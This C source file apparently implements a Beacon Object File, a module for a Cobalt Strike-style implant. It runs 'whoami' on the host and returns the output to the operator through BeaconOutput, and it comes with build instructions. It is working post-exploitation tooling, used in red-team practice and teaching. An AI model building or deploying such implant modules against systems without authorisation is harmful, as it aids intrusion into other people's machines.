/*
 * bof_whoami.c - BOF that runs "whoami" and returns the output via BeaconOutput.
 *
 * Build with MinGW-w64:
 *   x86_64-w64-mingw32-gcc -c bof_whoami.c -o bof_whoami.o
 *
 * Build with MSVC (from x64 Native Tools Command Prompt):
 *   cl /c /GS- bof_whoami.c /Fo bof_whoami.o
 *
 * The BOF loader resolves __imp_KERNEL32$... symbols at runtime via
 * LoadLibraryA + GetProcAddress.
 */

#include <windows.h>
#include "beacon.h"

/* Import Windows APIs using BOF convention (LIBRARY$Function) */
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);

#define HANDLE_FLAG_INHERIT_VAL 0x00000001

/* Simple memset replacement to avoid CRT dependency */
static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}

void go(char* args, int alen)
{
    HANDLE hReadPipe  = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char buf[4096];
    DWORD bytesRead;

    (void)args;
    (void)alen;

    /* Create an anonymous pipe for stdout capture */
    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;

    if (!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        BeaconOutput(CALLBACK_ERROR, "CreatePipe failed\n", 18);
        return;
    }

    /* Prevent the read end from being inherited */
    KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT_VAL, 0);

    /* Set up STARTUPINFO to redirect stdout + stderr to the pipe */
    bof_memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = hWritePipe;
    si.hStdError   = hWritePipe;
    si.hStdInput   = NULL;

    bof_memset(&pi, 0, sizeof(pi));

    /* Launch whoami.exe */
    if (!KERNEL32$CreateProcessA(
            NULL,
            "whoami",
            NULL, NULL,
            TRUE,       /* inherit handles */
            0,
            NULL, NULL,
            &si, &pi))
    {
        BeaconOutput(CALLBACK_ERROR, "CreateProcess failed\n", 20);
        KERNEL32$CloseHandle(hReadPipe);
        KERNEL32$CloseHandle(hWritePipe);
        return;
    }

    /* Close the write end in our process so ReadFile will eventually return 0 */
    KERNEL32$CloseHandle(hWritePipe);

    /* Wait for the process to finish (5s timeout) */
    KERNEL32$WaitForSingleObject(pi.hProcess, 5000);

    /* Read all output from the pipe */
    while (KERNEL32$ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        BeaconOutput(CALLBACK_OUTPUT, buf, (int)bytesRead);
    }

    /* Cleanup */
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(hReadPipe);
}
